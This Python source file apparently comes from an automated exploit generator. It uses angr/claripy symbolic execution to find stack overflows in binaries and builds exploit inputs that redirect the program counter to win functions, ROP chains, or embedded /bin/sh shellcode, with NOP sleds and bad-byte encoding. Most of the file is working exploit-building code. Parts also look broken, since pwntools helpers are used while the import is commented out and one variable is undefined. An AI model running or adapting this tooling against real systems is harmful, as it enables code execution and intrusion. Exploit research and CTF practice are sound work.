import claripy
from .radare_helper import findShellcode

# from pwn import *

is_printable = False


def constrainToAddress(state, sym_val, addr, endian="little"):

    bits = state.arch.bits
    padded_addr = 0

    if bits == 32:
        padded_addr = p32(addr, endian=endian)
    elif bits == 64:
        botAddr = addr & 0xFFFFFFFF
        topAddr = (addr >> 32) & 0xFFFFFFFF
        padded_addr = p32(topAddr, endian=endian) + p32(botAddr, endian=endian)

    constraints = []
    for i in range(bits / 8):
        curr_byte = sym_val.get_byte(i)
        constraint = claripy.And(curr_byte == padded_addr[i])
        if state.se.satisfiable(extra_constraints=[constraint]):
            constraints.append(constraint)

    return constraints


def getShellcode(properties):
    context.arch = properties["protections"]["arch"]

    if context.arch == "i386" and False:  # /bin/sh shellcode - 23 bytes
        shellcode = (
            b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
            + b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        )
    elif context.arch == "x64":  # /bin/sh shellcode - 23 bytes
        shellcode = (
            b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
            + b"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
        )
    else:
        assembly = shellcraft.sh()  # This works, but the shellcode is usually long
        shellcode = asm(assembly)
    return shellcode


def find_symbolic_buffer(state, length, arg=None):
    """
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
    control
    """
    # get all the symbolic bytes from stdin
    user_input = state.globals["user_input"]

    sym_addrs = []
    sym_addrs.extend(state.memory.addrs_for_name(next(iter(user_input.variables))))

    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr


def check_continuity(address, addresses, length):
    """
    dumb way of checking if the region at 'address' contains 'length' amount of controlled
    memory.
    """

    for i in range(length):
        if not address + i in addresses:
            return False

    return True


def overflow_detect_filter(simgr):

    for state in simgr.unconstrained:
        bits = state.arch.bits
        num_count = bits / 8
        pc_value = b"C" * int(num_count)

        # Check satisfiability
        if state.solver.satisfiable(extra_constraints=[state.regs.pc == pc_value]):

            state.add_constraints(state.regs.pc == pc_value)
            user_input = state.globals["user_input"]

            print("Found vulnerable state.")

            if is_printable:
                print("Constraining input to be printable")
                for c in user_input.chop(8):
                    constraint = claripy.And(c > 0x2F, c < 0x7F)
                    if state.solver.satisfiable([constraint]):
                        state.add_constraints(constraint)

            # Get input values
            input_bytes = state.solver.eval(user_input, cast_to=bytes)
            print("[+] Vulnerable path found {}".format(input_bytes))
            state.globals["type"] = "Overflow"
            state.globals["input"] = input_bytes
            simgr.stashes["found"].append(state)
            simgr.stashes["unconstrained"].remove(state)
            break

    return simgr


def point_to_win_filter(simgr):

    for state in simgr.unconstrained:
        properties = state.globals["properties"]

        for func in properties["win_functions"]:
            address = properties["win_functions"][func]["fcn_addr"]

            print("Trying {}".format(hex(address)))

            # Check satisfiability
            if state.solver.satisfiable(extra_constraints=[state.regs.pc == address]):
                state.add_constraints(state.regs.pc == address)
                user_input = state.globals["user_input"]

                if is_printable:
                    print("Constraining input to be printable")
                    for c in user_input.chop(8):
                        constraint = claripy.And(c > 0x2F, c < 0x7F)
                        if state.solver.satisfiable([constraint]):
                            state.add_constraints(constraint)

                # Get the string coming into STDIN
                input_bytes = state.solver.eval(user_input, cast_to=bytes)
                print("[+] Vulnerable path found {}".format(input_bytes))
                state.globals["type"] = "Overflow"
                state.globals["input"] = input_bytes
                simgr.stashes["found"].append(state)
                simgr.stashes["unconstrained"].remove(state)
            return simgr

    return simgr


def point_to_shellcode_filter(simgr):
    for state in simgr.unconstrained:
        properties = state.globals["properties"]
        shellcode = getShellcode(properties)

        # Find potential addresses for shellcode
        addresses = [x for x in find_symbolic_buffer(state, len(shellcode))]
        if len(addresses):
            list.sort(addresses)

        # Can we add a nop sled?
        max_nop_count = 0
        if addresses:
            for x in range(0x50):
                bigger_addrs = [
                    x for x in find_symbolic_buffer(state, len(shellcode) + x)
                ]
                if bigger_addrs:
                    addresses = bigger_addrs
                    max_nop_count = x
        if max_nop_count > 0:
            print("Adding {} nops to shellcode".format(max_nop_count))
            shellcode = b"\x90" * max_nop_count + shellcode

        # Build shellcode and check for bad chars
        avoidList = []
        for address in addresses:
            my_buf = state.memory.load(address, len(shellcode))
            if not state.satisfiable(extra_constraints=([my_buf == shellcode])):
                print("[~] Shellcode can't be placed. Checking for bad bytes.")
                for i in range(len(shellcode)):
                    curr_byte = state.memory.load(address + i, 1)
                    if state.satisfiable(
                        extra_constraints=([curr_byte == shellcode[i]])
                    ):
                        pass
                        # print("[+] Byte {} Can be {}".format(i,repr(shellcode[i])))
                    else:
                        print(
                            "[-] Address {} Byte {} Can't be {}".format(
                                hex(address + i), i, repr(shellcode[i])
                            )
                        )
                        avoidList.append(shellcode[i])
                print("Avoiding : {}".format(avoidList))
                print("Old shellcode: {} {}".format(len(shellcode), repr(shellcode)))
                try:
                    shellcode = encoders.encode(shellcode, avoidList)
                    print(
                        "New shellcode: {} {}".format(len(shellcode), repr(shellcode))
                    )
                except PwnlibException as e:
                    print(
                        "[-] Unable to encode shellcode to avoid {}".format(avoidList)
                    )
                break

        # addresses = [x for x in find_symbolic_buffer(state,len(shellcode))]
        print("Trying addresses : {}".format(addresses))
        # Iterate over addresses looking for a winner
        for address in addresses:
            print("Trying address {}".format(hex(address)))

            # Setup shellcode
            memory = state.memory.load(address, len(shellcode))
            shellcode_bvv = state.solver.BVV(shellcode)

            constraint = claripy.And(memory == shellcode_bvv, state.regs.pc == address)

            # Check satisfiability
            if state.solver.satisfiable(extra_constraints=[constraint]):
                print("[+] Win")
                state.add_constraints(constraint)

                user_input = state.globals["user_input"]

                if is_printable:
                    print("Constraining input to be printable")
                    for c in user_input.chop(8):
                        constraint = claripy.And(c > 0x2F, c < 0x7F)
                        if state.solver.satisfiable([constraint]):
                            state.add_constraints(constraint)

                # Get the string coming into STDIN
                input_bytes = state.solver.eval(
                    user_input, cast_to=bytes, extra_constraints=[constraint]
                )

                # r2_address = findShellcode(state.project.filename, \
                #     state.history.bbl_addrs[-1], shellcode, input_bytes)

                # print("Got r2 address : {}".format(hex(r2_address['offset'])))
                print("vs {}".format(hex(address)))

                # r2_constraint = claripy.And(memory == shellcode_bvv, state.regs.pc == r2_address)
                # r2_input_bytes = state.solver.eval(user_input, \
                #     cast_to=bytes, extra_constraints=[r2_constraint])

                print("[+] Vulnerable path found {}".format(input_bytes))
                state.globals["type"] = "Overflow"
                state.globals["input"] = input_bytes
                simgr.stashes["found"].append(state)
                return simgr

    return simgr


"""
This function just swaps out shellcode for ropchain.
There has to be a better way to genericize this
"""


def point_to_ropchain_filter(simgr):
    for path in simgr.unconstrained:
        bad_bytes = set()
        rop_chain = getRopchain(properties, bad_bytes)
        state = path.state

        eip = state.regs.pc
        bits = state.arch.bits

        state_copy = state.copy()

        addresses = [x for x in find_symbolic_buffer(state_copy, len(rop_chain))]
        if len(addresses):
            list.sort(addresses)

        for address in addresses:
            my_buf = state_copy.memory.load(address, len(rop_chain))
            if not state_copy.satisfiable(extra_constraints=([my_buf == rop_chain])):
                print("[~] rop chain can't be placed. Checking for bad bytes.")
                for i in range(len(rop_chain)):
                    curr_byte = state_copy.memory.load(address + i, 1)
                    if state_copy.satisfiable(
                        extra_constraints=([curr_byte == rop_chain[i]])
                    ):
                        pass
                    else:
                        print(
                            "[-] Address {} Byte {} Can't be {}".format(
                                hex(address + i), i, repr(rop_chain[i])
                            )
                        )
                        #                            byte_hex = hex(rop_chain[i]).rstrip('L').rstrip('0x')
                        byte_hex = rop_chain[i].encode("hex")
                        bad_bytes.add(byte_hex)
                print("Avoiding : {}".format(bad_bytes))
                print("Old ropchain: {} {}".format(len(rop_chain), repr(rop_chain)))

                try:
                    rop_chain = getRopchain(properties, bad_bytes)
                except Exception as e:
                    print(e)
                    print("[-] Error building rop_chain. To many bad bytes?")
                    exit(0)
                break

        addresses = [x for x in find_symbolic_buffer(state_copy, len(rop_chain))]

        for address in addresses:
            print(("[+] Found address at {}\r".format(hex(address))), end=" ")
            state_copy = state.copy()

            padded_addr = 0

            if bits == 32:
                padded_addr = p32(address)
            elif bits == 64:
                botAddr = address & 0xFFFFFFFF
                topAddr = (address >> 32) & 0xFFFFFFFF
                padded_addr = p32(topAddr) + p32(botAddr)

            my_buf = state.memory.load(address, len(rop_chain))

            # Constrain pc to rop_chain
            constraints = constrainToAddress(state_copy, eip, address)

            # Setup rop_chain
            memory = state_copy.memory.load(address, len(rop_chain))
            rop_chain_bvv = state_copy.se.BVV(rop_chain)

            constraints.append(memory == rop_chain_bvv)

            # Setup endianness - A weird number of CTF problems have endianess issues
            state_eb = state.copy()

            # Constrain EIP to rop_chain address
            constraints_le = constrainToAddress(state, eip, address, endian="little")
            constraints_eb = constrainToAddress(state_eb, eip, address, endian="big")

            # Check satisfiability
            if (
                state_copy.se.satisfiable(extra_constraints=constraints)
                and state_eb.se.satisfiable(extra_constraints=constraints_eb)
                and state.se.satisfiable(extra_constraints=constraints_le)
                and len(constraints_eb) == 4
                and len(constraints_le) == 4
            ):
                print("[+] Win")
                for constraint in constraints:
                    state_copy.add_constraints(constraint)

                # Check by input
                if (
                    state_copy.globals["inputType"] == "STDIN"
                    or state_copy.globals["inputType"] == "LIBPWNABLE"
                ):
                    if all(
                        [x in state_copy.posix.dumps(0) for x in padded_addr]
                    ) and all([x in state_copy.posix.dumps(0) for x in rop_chain]):

                        # Constrain STDIN to printable if we can
                        if state.se.satisfiable(extra_constraints=constraints_le):
                            for constraint in constraints:
                                state.add_constraints(constraint)

                        # Constrain STDIN to printable if we can
                        if state_eb.se.satisfiable(extra_constraints=constraints_eb):
                            for constraint in constraints_eb:
                                state_eb.add_constraints(constraint)

                        # Setup rop_chain
                        memory = state.memory.load(address, len(rop_chain))
                        rop_chain_bvv = state.se.BVV(rop_chain)

                        # Setup rop_chain constraints
                        if state.se.satisfiable(
                            extra_constraints=[memory == rop_chain_bvv]
                        ):
                            state.add_constraints(memory == rop_chain_bvv)

                        # Setup rop_chain
                        memory = state_eb.memory.load(address, len(rop_chain))
                        rop_chain_bvv = state_eb.se.BVV(rop_chain)

                        # Setup rop_chain constraints
                        if state_eb.se.satisfiable(
                            extra_constraints=[memory == rop_chain_bvv]
                        ):
                            state_eb.add_constraints(memory == rop_chain_bvv)

                        # Little Endian
                        # Constrain rest of input to be printable
                        stdin = state.posix.files[0]
                        constraints = []
                        # stdin_size = len(stdin.all_bytes())
                        stdin_size = 100
                        stdin.length = stdin_size
                        stdin.seek(0)
                        stdin_bytes = stdin.all_bytes()
                        for i in range(stdin_size):
                            curr_byte = stdin.read_from(1)
                            constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
                            if state.se.satisfiable(extra_constraints=[constraint]):
                                constraints.append(constraint)

                        # Constrain STDIN to printable if we can
                        if state.se.satisfiable(extra_constraints=constraints):
                            for constraint in constraints:
                                state.add_constraints(constraint)

                        # Big Endian
                        # Constrain rest of input to be printable
                        stdin = state_eb.posix.files[0]
                        constraints = []
                        # stdin_size = len(stdin.all_bytes())
                        stdin_size = 100
                        stdin.length = stdin_size
                        stdin.seek(0)
                        stdin_bytes = stdin.all_bytes()
                        for i in range(stdin_size):
                            curr_byte = stdin.read_from(1)
                            constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
                            if state_eb.se.satisfiable(extra_constraints=[constraint]):
                                constraints.append(constraint)

                        # Constrain STDIN to printable if we can
                        if state_eb.se.satisfiable(extra_constraints=constraints):
                            for constraint in constraints:
                                state_eb.add_constraints(constraint)

                        # Get the string coming into STDIN
                        # stdin_str = repr(str(state.posix.dumps(0).replace('\x00\x00\x00','').replace('\x01','')))
                        stdin_str = repr(str(state.posix.dumps(0)))
                        print("[+] Vulnerable path found {}".format(stdin_str))
                        state.globals["type"] = "Overflow"
                        state.globals["state_eb"] = state_eb
                        simgr.stashes["found"].append(path)
                        try:
                            simgr.stashes["unconstrained"].remove(path)
                        except (KeyboardInterrupt, timeout_decorator.TimeoutError) as e:
                            pass
                        break

                if state_copy.globals["inputType"] == "ARG":
                    arg = state.globals["arg"]
                    arg_str = str(state_copy.solver.eval(arg, cast_to=str))
                    if "A" in arg_str:
                        constraints = []
                        for i in range(bits / 8):
                            curr_byte = eip.get_byte(i)
                            constraint = claripy.And(curr_byte == 0x41)
                            constraints.append(constraint)

                        for i in range(arg.length):
                            curr_byte = arg.read_from(1)
                            constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
                            if state.se.satisfiable(extra_constraints=[constraint]):
                                constraints.append(constraint)

                        # Constrain STDIN to printable if we can
                        if state.se.satisfiable(extra_constraints=constraints):
                            for constraint in constraints:
                                state.add_constraints(constraint)

                        arg_str = str(state.solver.eval(arg, cast_to=str))
                        print("[+] Vulnerable path found {}".format(arg_str))
                        state.globals["type"] = "Overflow"
                        simgr.stashes["found"].append(path)
                        simgr.stashes["unconstrained"].remove(path)
    return simgr
